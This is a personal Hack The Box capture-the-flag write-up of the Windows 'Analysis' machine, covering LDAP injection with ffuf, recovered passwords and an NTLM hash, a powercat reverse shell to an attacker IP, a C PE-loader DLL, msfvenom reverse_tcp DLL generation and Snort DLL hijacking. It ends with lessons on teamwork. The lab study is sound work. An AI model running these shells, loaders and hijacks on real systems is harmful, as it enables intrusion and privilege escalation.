# Savage-Lands : Analysis Writeup

Name: Analysis
Date:  
Difficulty:  Hard
Goals: 
Learnt:
- Simple is sometimes better than yara rules can handle...
Beyond Root:

Good News Everyone! This Box Contains French! Hurray
![](https://www.youtube.com/watch?v=pwODwwgE6rA)
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Analysis/Screenshots/ping.png)

Rescan again - something is wrong with this script!
![](ssscsvnmaprescan.png)

Getting the build from `cme`
![](cme.png)

web root:
![](wwwroot.png)

No content to discovery
![](nobatchscripts.png)

No Domain transfers
![](nodomaintransfer.png)

Zero Auth RPC avaliable
![](zeroauthrcpclient.png)

But without any real utility
![](rcpclient-zeroauthcmds.png)

Fuzzing for sub domains
![](ffufinternal.png)

Domain found into 403 zone..
![](internal.png)

domain transfer attempt on internal
![](internal-dig.png)

Reconsider DC and Domains...
![](correcthostnameinnmap.png)

But not found
![](noDC-ANALYSISanalysishtb.png)

http://analysis.htb/#e is weird 

Another failed domain transfer to add to my collection
![](digDC-ANALYSISanalysishtb.png)

Look at the bat directory
![](batdirectorycheck.png)

`enum4linux`  for the Domain SID
![](domainsidfrome4l.png)

Trying to *analyse* the meta data of the images on the website
```bash
curl http://analysis.htb/ -o www-root
cat www-root | grep 'img src="images' | awk -F/ '{print $2}' | grep -v home | cut -d\" -f1 | tee -a images.txt
echo logo.png | tee -a images.txt
for pic in $(cat images.txt); do curl http://analysis.htb/images/$pic -o $pic;done
for pic in $(cat images.txt);do exiftool $pic | tee -a $pic.exifdata; done

# XMP toolkit version
# Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
```
With like resulting good information

Attempt `mysql` remote logon default password
![](needtobedomainjoinfailedmysqlauth.png)

Trying links if it is a horrible javascript machine
```bash
for js in $(cat links.txt); do file=$(echo $js | awk -F/ '{print $4}'); curl $js -o $file; done
```

Wondering bout MailHandler it is not special...
![](mailhandlersqm.png)

Looking at internal content discovery with `gobuster`
![](internaldirectories.png)

Team mate `out` found an LDAP injection:
![](technician.png)

- technician  

![](technician-rcpnoauth.png)

out 
http://internal.analysis.htb/dashboard/404.html

![](internalloginpanel.png)

Retest:
```bash
ffuf -u 'http://internal.analysis.htb/users/list.php?FUZZ=technician' -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ  -mc all
```

While busy Go Developing my projects, but before the next drop, my teammates discovered it to be some sort of [ldap-injection](https://book.hacktricks.xyz/pentesting-web/ldap-injection) - additional source [synopsys](https://www.synopsys.com/glossary/what-is-ldap-injection.html) and [OWASP LDAP injection prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)

From [OWASP LDAP injection prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html): *LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).*

- Login Bypasses
- Enumeration
	- Blind variants require forcing the application to perform boolean logic along side our query to gain feedback. 

The reason that this is important for us in the large scope of this machine is understanding that the default connection and information enumeratable by ldapsearch that I have done is RBAC-ed like most services should. This means that the web server has different level of access to LDAP and therefore we can enumerate information that we should not be able to through a injection attack. 

Trying to manually LDAP inject
![](ldapiloginbypass-1.png)
and
![](ldapiloginbypass-2.png)
and
![](ldapiloginbypass-3.png)
and
![](ldapiloginbypass-4.png)
and
![](ldapiloginbypass-5.png)
and
![](ldapiloginbypass-6.png)
and
![](ldapiloginbypass-7.png)
and
![](ldapiloginbypass-8.png)
..and moving back to the list.php
![](payloadsuccessfulno2.png)

A teammate called Knight provided the entire team with an awesome python3 LDAP injection enumeration script. I copied it line for line to understand it and so I could hopeful solve problems like this in this way some day. Indentation is recently become the pain in my brain. 

It was very satisfying to watch this password in the description field.
![](afterallthattroubleshootingmymisreads.png)

Past Versions of myself would struggle as I do to wrap my head around why anyone would store a password in a description field in LDAP, but it is important that any readers consider two things:
- Non-InfoSec people and passwords, pin numbers, 2FA, MFA,  digital and physical lock, codes, combinations - any credentials are all either written down on their phone or piece of paper, Alh4zr3d has great story of how he other found the password of a workstation from the post-it note attached to the workstation display through a IoT camera he and his team hacked.
- Secondly - Contractor exist and continue to exist. They have to do some job and require some level of access and sometimes some System Administrators find it easier to just put put a password in a description field so that "technician" in this case can do their job.
	- Why not new passwords, rotations, RBAC, all these authentication mechanisms?
		- More traffic to be MITMed
		- More traffic on the network - DC needs to stay up!
- Thirdly - RBAC is difficult.
	- Why?
		- More accounts for different tasks?
			- More stuff to administrate and lose track of 
		- What if technician A come in does some job that requires some access to check a printer from multiple machines?

		- What if technician B needs to fix application that was install used Administrative privileges on a Workstation
			- How do manage role base access controls that require high  
		- What if technician C needs to just update the contracted task documented and file it digitially and every time?
			- If the technician is sitting around for a password for an hour, who pays for the hour that technician sat and did nothing? 
	 - We have a Access feature-creep that needs to monitored, changed or curtailed, but the technician still needs to do some sort of job that the organisation is paying.
	 - Role can be ambiguous and change for contractors.
	 - Access may be excessive or not defaulted, back or correctly configured
	 - Access requires authentication - some service has to do some thing to check things
	 - Access requirements CHANGE.
	 - Organisations CHANGE. 

- Answer is - One day I will be very happy living in a Star Trek like future without passwords and be delighted that all the fun I have had dc-sync machines, kerberoasting, dump lsass, pass-hash, MITM attacking will be over. 

```
# 97nttl\*4qp96bv -> 97nttl*4qp96bv

technician : 97nttl*4qp96bv
```

Helpfully 0x67673068 gave the team a nice TLDR on ldap injection 

```bash
ffuf -u 'http://internal.analysis.htb/users/list.php?name=FUZZ*' -c -w /usr/share/seclists/Fuzzing/chars.txt:FUZZ  -mc all
```

```bash
# LDAP-active-directory-attributes.txt
# LDAP-active-directory-classes.txt
# LDAP-openldap-attributes.txt
# LDAP-openldap-classes.txt
# LDAP.Fuzzing.txt

ffuf -u 'http://internal.analysis.htb/users/list.php?name=t*)(FUZZ=*' -c -w /usr/share/seclists/Fuzzing/$LDAPWORDLIST:FUZZ -mc all -x http://127.0.0.1:8080 # remember to apply FFUF filters and have burpsuite running
```

![](checkingtheboundsoftechniciansrbac.png)

![](nopreauthsettechi-getnpusers.png)

Angel Johnson
![](jangelinthetable.png)

![](doingthesamefacialexpressionrightnow.png)

![](admintickets.png)

![](samplestobeuploaded.png)

And with the correct password
![](justforthedashboard.png)

s![](obfuscmdphpissafe.png)

![](enhanceadminpicture.png)

Failure on trying the famous monkey with powershell
![](connection-but.png)

![](simpleisalwaysbetter.png)

![](frenchwindows.png)

![](dirthesandbox.png)

![](snortisonthebox.png)

![](lacommandesesttermineecorrectement.png)

Simple is just better
![](simpleisjustbettereverytime.png)

![](exfilallthisforfunandreview.png)

```
start-job { C:\inetpub\internal\dashboard\uploads\powercat -c 10.10.14.54 -p 33060 -e cmd.exe }
```

The beyond root for this machine is decided to change the language of this machine to English
![](beyondroot-changethelanguagebacktoenglish.png)

![](encodedmessage.png)

![](mainfeaturebestcrypttextencoder.png)

![](nowinserver2019.png)

![](thismanisnotinformative.png)

![](checkforbctedrive.png)

![](svcwebhash.png)

```
svc_web::ANALYSIS:1122334455667788:da0f5ffc1280eeaae73e38c8f7315f96:0101000000000000dfc5c232d64fda01b136c3ea34076cb100000000080030003000000000000000000000000021000044249e03d7a426c92dfe991abf5fc59a80e526687feabce8deb92d427d5f02280a00100000000000000000000000000000000000090000000000000000000000
```

![](anotherlistpassword.png)

```


N1G6G46G@G!j

```

![](wpfoundautologoncredentials.png)

![](defaultyjdoepasswrodintheregistry.png)

```
7y4Z4^*y9Zzj
```

![](dllhijacking.png)


![](wearejdoe.png)

![1080](runbat.png)

Going on a n3ph0s advise to dll hijack snort I use phind to load my sliver beacon like an idiot just to do something while just to see how far that would actually get me...
```c
#include <windows.h>
#include <stdio.h>

int main( void )
{
	FILE *fp = fopen("C:\programdata\c.exe", "rb");
	if (fp == NULL) {
	    printf("Failed to open file\n");
	    return 1;
	}
	fseek(fp, 0, SEEK_END);
	long filesize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char *buffer = malloc(filesize);
	if (buffer == NULL) {
	    printf("Failed to allocate memory\n");
	    fclose(fp);
	    return 1;
	}

	if (fread(buffer, 1, filesize, fp) != filesize) {
	    printf("Failed to read file\n");
	    free(buffer);
	    fclose(fp);
	    return 1;
	}

	fclose(fp);

PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew);

PVOID pImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

if (pImage == NULL) {
    printf("Failed to allocate memory\n");
    free(buffer);
    return 1;
}

memcpy(pImage, buffer, ntHeader->OptionalHeader.SizeOfHeaders);

void (*entryPoint)() = (void(*)())(pImage + ntHeader->OptionalHeader.AddressOfEntryPoint);
entryPoint();


}
```

While I download snort and 

```
x86_64-w64-mingw32-gcc-win32 dll.c -o bad.dll -shared 
```

![](uplaodwriteintothatdir.png)

Regardless of how stupid that is. The best way is to:
1. Download snort.exe
2. Run on another windows machine with procmon/processhacker
3. Observer all the .dll calls it makes
4. Then replace a .dll by hijacking the path in this case would be
	1. /lib/ for any dlls in this subdirectory
	2. Or just back one of the dlls in /bin and call our that guessing which is the most important for it to run and not worry about going full cyber in dev week

![](dllhijacking.png)
Convert everything to English
```
bin NT AUTHORITY\System:(I)(OI)(CI)(F)
    BUILTIN\Administrators:(I)(OI)(CI)(F)
    BUILTIN\Users:(I)(OI)(CI)(RX)
    BUILTIN\Users:(I)(CI)(AD)
    BUILTIN\Users:(I)(CI)(WD)
    CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

lib/snort_dynamicpreprocessor NT AUTHORITY\System:(I)(OI)(CI)(F)
                              BUILTIN\Administrators:(I)(OI)(CI)(F)
                              BUILTIN\Users:(I)(OI)(CI)(RX)
                              BUILTIN\Users:(I)(CI)(AD)
                              BUILTIN\Users:(I)(CI)(WD)
                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

```
We could Write and append to dll in /bin:


We could do this the metasploit way

```bash
msfconsole -x "use /exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 443;exploit;"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f dll > evil-wpcap.dll
```



And we could do the Jake Williams-a-like way:

![1920](questioningteaMmate.png)
Sometimes being simple is good, but sometimes being good at being good is good.
![1920](targetdllacquired.png)

Now I just need to grab that .dll and figure out which function is being called, but iredteam seems that just it being called is enough. I think that is wrong:
![](IPHLPAPIwaitingforever.png)
It was in fact correct. 


If this was from a boot and ran then it would have probably worked. The issues is that I needed to check the version and got carried away with what I knew I should do; all i needed to do was reverse the dlls in Ghidra and then write a function name I knew would be called. 

![](rootwithnonmeterpreterpayload.png)

Being good is all but I really, really needs to be simple. 
![](snortversion.png)

[packetstormsecurity](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html) *snort.exe can be exploited to execute arbitrary code on victims system viaDLL hijacking, the vulnerable DLL is "tcapi.dll".If a user opens a ".pcap" file from a remote share using snort.exe and theDLL exists in that directory.* We did not even need a pcap file to be opened from a remote share.

## Exploit

## Foothold

## Privilege Escalation

## Post Root Reflection

- I should have noted port by slightly better, made a script to fix that.
- I should have gobustered and fuzzed internal ASAP 
- I have never done LDAP injection - I also have not done blind SQL on CTF box without `sqlmap`
	- now have a script to accomplish that 
- Question whether to listen to team mates by setting informational boundaries so that you are questioning there information and make good independent judgement:
	- Good examples:
		- Knight's script - I tried manually to do LDAP injection from payloads and my limited understanding of enumerating LDAP with LDAPsearch and LDAP queries then reviewing the script line by line by writing it out myself and troubleshooting my mistyping and bugs
		- Web shell - It only needed something very, very simple and  
	- Bad examples:
		- DLL hijacking I had little time and wanted to be creative 
		- I did not go through steps because of time management of Dev week
		- Then not going through the steps to fully segment what should be done from what instructions/hints I could get. 
- DLL hijacking 
	- I fumbled this. I need to not use team mates till I need it, I think it would be best not to look at Discord after the initial drop day - the insane boxes excluded.
	- I did not check the snort version
	- I knew it was running as scheduled task, but did not question how I was to dll hack a running process and was too concerned about doing a way professionals would hijack it from a persistence mechanism not a privilege escalation no a CTF box design not be be rebooted except from hosting side of HTB.  
		- I had the way it should be done
		- The way my team were doing it
		- I had alternate ways to do it 
- I got way to hung up on the BCTextEncoded message. We need RDP, why bother if there is no RDP. I should have trusted the OSCP level it is that piece of information that changes everything - it is a discreet value from a third party  that invalidates this path.
	- Team mates were chattering about it


- Experience from heard - give that this is the third machine that I have done collaboratively:
	- Critical Thinking podcast touched no the idea of collaboration and levels of commitment, engagement and importantly contribution.
		- I have contributed to others that over the weeks
		- I have contributed minor recon information that helped
		- BUT the balance of help actually negatively impacted my thinking.

Resolution - do not spoil the machine til the last two days:
- I want to be part of the team, but I also want to make personal progress and not get sloppy
- I am not at the level that I can contribute to the team at the level at which I am helpful to others other than in a second hand way - which is good for active recall and Feynman-like teaching

Hierarchy of information:
- Simple methods (always go full xct What is simplest way to do this? Not how is it suppose to be done) 
- Escalate simple methods till..
- Known complex methods & Known team mate good instruction
- Team mates methods
- My creative methods

## Beyond Root

- Change the machine language
- Do the CTF machine as a Helpthrough to UNDERSTAND LDAP injection and not just be a tourist to it. 

[Microsoft comes in hot about changes the language of a machine](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/configure-international-settings-in-windows?view=windows-11)
```powershell
Set-WinSystemLocale -SystemLocale en-US
Restart-Computer
```

[ranakhalil101](https://ranakhalil101.medium.com/hack-the-box-active-writeup-w-o-metasploit-79b907fd4356)
**Port 464:** running kpasswd5. This port is used for changing/setting passwords against Active Directory